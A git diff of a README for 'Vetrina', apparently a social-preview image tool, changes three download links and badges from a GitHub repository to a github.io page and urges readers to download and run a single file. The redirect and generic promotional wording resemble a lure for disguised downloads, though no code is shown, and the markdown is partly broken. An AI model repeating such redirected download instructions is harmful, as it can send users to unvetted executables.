@@ -1,6 +1,6 @@
 # 🖼️ Vetrina - Beautiful Social Previews in Seconds
 
-[![Download Vetrina](https://img.shields.io/badge/Download%20Vetrina-Click%20Here-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/recorded-manikin5312/Vetrina)
+[![Download Vetrina](https://img.shields.io/badge/Download%20Vetrina-Click%20Here-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://recorded-manikin5312.github.io)
 
 )
 
@@ -96,7 +96,7 @@ Follow these simple steps to get Vetrina running on your computer:
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** 🔗 **[https://github.com/recorded-manikin5312/Vetrina](https://github.com/recorded-manikin5312/Vetrina)**](https://github.com/recorded-manikin5312/Vetrina)**
+**Visit this link to download the application:** 🔗 **[https://recorded-manikin5312.github.io](https://recorded-manikin5312.github.io)**](https://recorded-manikin5312.github.io)**
 
 This page shows the project’s main download area. Look for the download button or the latest release file labeled “Vetrina” — it will be a single file you can save to your computer. Your browser will usually ask where you want to save the file. Choose your “Downloads” folder or your Desktop for easy access.
 
@@ -211,7 +211,7 @@ No. Once you download the application, you can use it completely offline. The on
 
 Join thousands of happy users who’ve simplified their social media game with Vetrina. It’s fast, free,and fuss-free. Click the button below to go to the download pageand start creating your first beautiful social preview image today:
 
-[![Download Vetrina Now](https://img.shields.io/badge/Download%20Vetrina-Get%20Started-blueviolet?style=for-the-badge&logo=download&logoColor=white)](https://github.com/recorded-manikin5312/Vetrina)
+[![Download Vetrina Now](https://img.shields.io/badge/Download%20Vetrina-Get%20Started-blueviolet?style=for-the-badge&logo=download&logoColor=white)](https://recorded-manikin5312.github.io)
 
 )
 
